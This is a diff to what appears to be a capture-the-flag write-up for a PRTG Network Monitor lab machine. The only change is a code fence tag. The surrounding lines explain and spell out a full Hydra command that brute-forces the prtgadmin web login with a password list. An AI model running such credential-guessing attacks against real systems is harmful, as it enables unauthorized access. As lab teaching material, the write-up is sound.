@@ -33,6 +33,6 @@ for use POST requests
 **:loginurl=&username=^USER^&password=^PASS^** - fill username with username. In our case prtgadmin. Fill password with passwords from password list we specified  
 **:Your login has failed** - ignore responce if there such sting in it. If there are no such string in response - consider, that password was found  
 
-```bash
+```sh
 hydra -v -l prtgadmin -P /usr/share/john/password.lst 10.10.10.152 http-post-form "/public/checklogin.htm:loginurl=&username=^USER^&password=^PASS^:Your login has failed" -t 5 -I -
 ```
